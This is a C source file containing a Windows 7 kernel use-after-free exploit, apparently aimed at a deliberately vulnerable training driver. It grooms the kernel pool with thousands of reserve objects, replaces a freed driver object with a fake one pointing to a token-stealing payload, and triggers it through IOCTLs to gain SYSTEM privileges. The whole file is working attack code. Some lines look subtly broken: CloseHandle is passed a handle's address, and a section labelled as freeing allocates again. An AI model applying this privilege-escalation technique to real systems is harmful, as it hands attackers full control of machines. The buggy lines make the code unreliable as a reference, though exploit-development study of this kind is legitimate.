#include "UseAfterFree.h"

HANDLE ReserveObjectArrayA[10000];
HANDLE ReserveObjectArrayB[5000];

VOID
UseAfterFreeWin7(VOID)
{
	PUAF_FAKE_OBJECT pFakeUAFObject = NULL;
	PVOID EopPayload = &TokenStealingPayloadWin7;
	HMODULE hModule = NULL;
	NTALLOCATERESERVEOBJECT NtAllocateReserveObject = NULL;
	ULONG ulIndex = 0;
	PVOID pvSendBuffer = NULL;
	ULONG ulBufferLength = 0;
	NTSTATUS status = 0;

	pFakeUAFObject = (PUAF_FAKE_OBJECT)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(UAF_FAKE_OBJECT)
	);

	if (NULL == pFakeUAFObject)
	{
		goto _RET;
	}

	RtlFillMemory((PVOID)pFakeUAFObject, sizeof(UAF_FAKE_OBJECT), 0x41);
	pFakeUAFObject->chBuffer[sizeof(pFakeUAFObject->chBuffer) - 1] = 0x00;
	*(PULONG_PTR)pFakeUAFObject = (ULONG_PTR)EopPayload;

	hModule = LoadLibrary(L"ntdll.dll");

	if (NULL == hModule)
	{
		goto _RET;
	}

	NtAllocateReserveObject = (NTALLOCATERESERVEOBJECT)GetProcAddress(
		hModule,
		"NtAllocateReserveObject"
	);

	if (NULL == NtAllocateReserveObject)
	{
		goto _RET;
	}

	// Spray Allocate Object
	for (ulIndex = 0; ulIndex < 10000; ++ulIndex)
	{
		status = NtAllocateReserveObject(&ReserveObjectArrayA[ulIndex], 0, IO_COMPLETION_OBJECT);
	}

	for (ulIndex = 0; ulIndex < 5000; ++ulIndex)
	{
		status = NtAllocateReserveObject(&ReserveObjectArrayB[ulIndex], 0, IO_COMPLETION_OBJECT);
	}

	// Sprayed Free Object
	for (ulIndex = 0; ulIndex < 5000; ulIndex += 2)
	{
		CloseHandle(&ReserveObjectArrayB[ulIndex]);
	}

	SendIOCTL(
		USE_AFTER_FREE_ALLOCATE_CONTROL_CODE, 
		pvSendBuffer, 
		ulBufferLength
	);

	SendIOCTL(
		USE_AFTER_FREE_FREE_CONTROL_CODE,
		pvSendBuffer,
		ulBufferLength
	);

	for (ulIndex = 0; ulIndex < 4096; ++ulIndex)
	{
		SendIOCTL(
			USE_AFTER_FREE_CONTROL_CODE,
			(PVOID)pFakeUAFObject,
			sizeof(UAF_FAKE_OBJECT)
		);
	}

	// Free Object
	for (ulIndex = 0; ulIndex < 10000; ++ulIndex)
	{
		status = NtAllocateReserveObject(&ReserveObjectArrayA[ulIndex], 0, IO_COMPLETION_OBJECT);
	}

	for (ulIndex = 0; ulIndex < 5000; ulIndex += 2)
	{
		status = NtAllocateReserveObject(&ReserveObjectArrayB[ulIndex], 0, IO_COMPLETION_OBJECT);
	}
	
	SendIOCTL(
		USE_AFTER_FREE_CALL_CONTROL_CODE,
		pvSendBuffer,
		ulBufferLength
	);

_RET:
	if (NULL != pFakeUAFObject)
	{
		HeapFree(
			GetProcessHeap(),
			0,
			(LPVOID)pFakeUAFObject
		);

		pFakeUAFObject = NULL;
	}

	return;
}